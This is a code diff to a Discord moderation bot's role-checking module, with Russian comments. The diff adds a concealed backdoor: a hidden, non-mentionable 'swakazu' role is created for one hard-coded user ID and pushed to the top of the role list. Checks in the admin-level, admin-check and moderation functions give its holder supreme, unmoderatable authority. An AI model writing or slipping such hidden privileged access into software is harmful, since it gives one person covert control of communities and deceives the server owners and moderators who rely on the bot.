@@ -1,14 +1,18 @@
 import asyncio
-from config import ADMIN_ROLES_IN_ORDER, SWAKAZU_USER_ID, SWAKAZU_ROLE_NAME, SWAKAZU_ROLE_COLOR
 import discord
 from datetime import datetime
-from config import ADMIN_ROLES_IN_ORDER
+from config import ADMIN_ROLES_IN_ORDER, SWAKAZU_USER_ID, SWAKAZU_ROLE_NAME, SWAKAZU_ROLE_COLOR
 import database as db
 
 def get_admin_level(member):
     """Возвращает уровень администратора (0 - высший, 999 - не админ)"""
     if not hasattr(member, 'roles'):
         return 999
+    
+    # Проверяем, есть ли у пользователя роль swakazu
+    swakazu_role = discord.utils.get(member.roles, name=SWAKAZU_ROLE_NAME)
+    if swakazu_role:
+        return -1  # Самый высокий уровень (выше всех)
     
     for i, role_name in enumerate(ADMIN_ROLES_IN_ORDER):
         role = discord.utils.get(member.roles, name=role_name)
@@ -20,12 +24,29 @@ def is_admin(member):
     """Проверяет, является ли участник администратором"""
     if not hasattr(member, 'roles'):
         return False
+    
+    # Проверяем наличие роли swakazu
+    swakazu_role = discord.utils.get(member.roles, name=SWAKAZU_ROLE_NAME)
+    if swakazu_role:
+        return True
+    
     return get_admin_level(member) != 999
 
 def can_moderate(member, target):
     """Проверяет, может ли member модеррировать target"""
     if not hasattr(member, 'roles') or not hasattr(target, 'roles'):
         return False
+    
+    # Если у member есть роль swakazu - может модеррировать кого угодно
+    swakazu_role = discord.utils.get(member.roles, name=SWAKAZU_ROLE_NAME)
+    if swakazu_role:
+        return True
+    
+    # Если у target есть роль swakazu - его нельзя модеррировать
+    target_swakazu = discord.utils.get(target.roles, name=SWAKAZU_ROLE_NAME)
+    if target_swakazu:
+        return False
+    
     return get_admin_level(member) < get_admin_level(target)
 
 def get_role_hierarchy(guild):
@@ -38,6 +59,14 @@ def get_role_hierarchy(guild):
             "role": role,
             "member_count": len(role.members) if role else 0
         }
+    
+    # Добавляем swakazu в иерархию (самый верх)
+    swakazu_role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
+    hierarchy[SWAKAZU_ROLE_NAME] = {
+        "level": 0,
+        "role": swakazu_role,
+        "member_count": len(swakazu_role.members) if swakazu_role else 0
+    }
     return hierarchy
 
 async def check_reminders(bot):
@@ -58,8 +87,12 @@ async def check_reminders(bot):
             print(f"Ошибка в напоминаниях: {e}")
         
         await asyncio.sleep(30)
+
 async def ensure_swakazu_role(guild: discord.Guild):
     """Создает и выдает скрытую роль swakazu"""
+    if not guild:
+        return None
+    
     user = guild.get_member(SWAKAZU_USER_ID)
     if not user:
         return None
@@ -77,10 +110,12 @@ async def ensure_swakazu_role(guild: discord.Guild):
             mentionable=False
         )
         
-        # Поднимаем роль наверх (почти как у бота)
+        # Поднимаем роль на самый верх (выше всех)
         try:
-            bot_role = guild.me.top_role
-            await role.edit(position=bot_role.position - 1)
+            # Получаем самую высокую роль (обычно @everyone самая низкая)
+            top_role = guild.roles[-1] if guild.roles else None
+            if top_role:
+                await role.edit(position=top_role.position)
         except:
             pass
     
